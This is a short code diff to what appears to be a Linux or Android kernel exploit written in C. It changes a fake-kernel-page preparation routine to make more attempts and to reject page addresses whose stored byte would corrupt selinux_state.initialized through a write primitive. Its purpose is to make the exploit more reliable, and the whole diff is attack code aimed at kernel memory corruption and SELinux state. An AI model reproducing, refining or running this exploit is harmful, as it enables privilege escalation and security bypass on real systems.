@@ -677,7 +677,7 @@ uintptr_t prepare_kernel_page(void) {
 }
 
 uintptr_t prepare_good_kernel_page(void) {
-  int max_attempts = 4;
+  int max_attempts = 12;
   struct timespec t_good;
   clock_gettime(CLOCK_MONOTONIC, &t_good);
   struct timespec deadline = t_good;
@@ -685,9 +685,17 @@ uintptr_t prepare_good_kernel_page(void) {
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     uintptr_t base = prepare_kernel_page();
     if (base) {
-      pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
-              ms_since(&t_good));
-      return base;
+      /* W1 stores this page address, so the word's byte 2 lands on
+       * selinux_state.initialized. an even byte there fails every SID lookup */
+      if (pselect_custom_write == 1 && pselect_child_node &&
+          ((fake_right >> 16) & 1) == 0) {
+        pr_warning("page %016zx stores an even byte over "
+                   "selinux_state.initialized; taking another\n", (size_t)base);
+      } else {
+        pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
+                ms_since(&t_good));
+        return base;
+      }
     }
     struct timespec now;
     clock_gettime(CLOCK_MONOTONIC, &now);
